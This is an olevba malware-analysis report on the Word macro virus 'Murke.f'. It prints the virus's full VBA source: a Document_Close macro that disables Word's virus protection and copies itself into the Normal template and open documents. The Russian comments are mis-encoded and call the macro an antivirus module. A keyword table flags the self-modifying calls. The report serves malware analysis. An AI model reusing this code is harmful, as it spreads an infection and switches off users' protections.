olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Murke.f-7afc743607e4f37ec796a58e09694c89f67a6cab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Murke.f-7afc743607e4f37ec796a58e09694c89f67a6cab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
'*************************************************************************
'Murka - Ýòî ñàìûé ìàëåíüêèé èç âñåõ èçâåñòíûõ ÌàêðîÀíòèâèðóñíûõ ìîäóëåé!
'Ïðèíöèï äåéñòâèÿ: Çàãðóæàåòñÿ âìåñòå ñ äîêóìåíòîì è áëîêèðóåò
'                 ðàñïðîñòðàíåíèå çàðàæåííûõ ìîäóëåé
'
'Óñëîâèÿ ðàñïðîñòðàíåíèÿ: Freeware(Ñâîáîäíî)
'Äîñòîèíñòâà:             Êîððåêòíàÿ ðàáîòà, íàäåæíîñòü!
'Íåäîñòàòêè:              Ïîêà íå íàøåë
'
'"Âñå ýòî, êîíå÷íî, õîðîøî, íî ÿ íè õðåíà íå ïîíÿë, êàê åãî
' ìîæíî ïðåîáðåñòè?!" - ãíåâíî ñêàæåøü òû. Ìîæíî!
'Äåä MustDie âàì âñå ðàñêàæåò!
'Íåîáõîäèìî ëèøü îòêðûòü äîêóìåíò íà ïåðñîíàëüíîì
'êîìïå. ãäå óæå óñòàíîâëåí àíòèâèðóñíûé ìîäóëü Murka.
'
'Àâòîðó:   mustdie@chat.ru
'Murke:    murka@chat.ru
'Äàíèëîâó: antivir@dials.ru
'*************************************************************************
On Error Resume Next
Dim s As Boolean
Dim t As Object
Dim i As Long
Dim Murka As String
  s = ActiveDocument.Saved
  Application.EnableCancelKey = wdCancelDisabled
  With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
  'ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines
  i = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  Murka = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, i)
  If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, i) <> Murka Then
    Set t = NormalTemplate.VBProject.VBComponents.Item(1)
  ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, i) <> Murka Then
    Set t = ActiveDocument.VBProject.VBComponents.Item(1)
  Else
    t = Nothing
  End If
  If TypeName(t) <> "Nothing" Then
    t.CodeModule.InsertLines 1, Murka
    Randomize
    If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Murka": .Author = "M&M": .Execute: End With
    If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
  End If
  If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

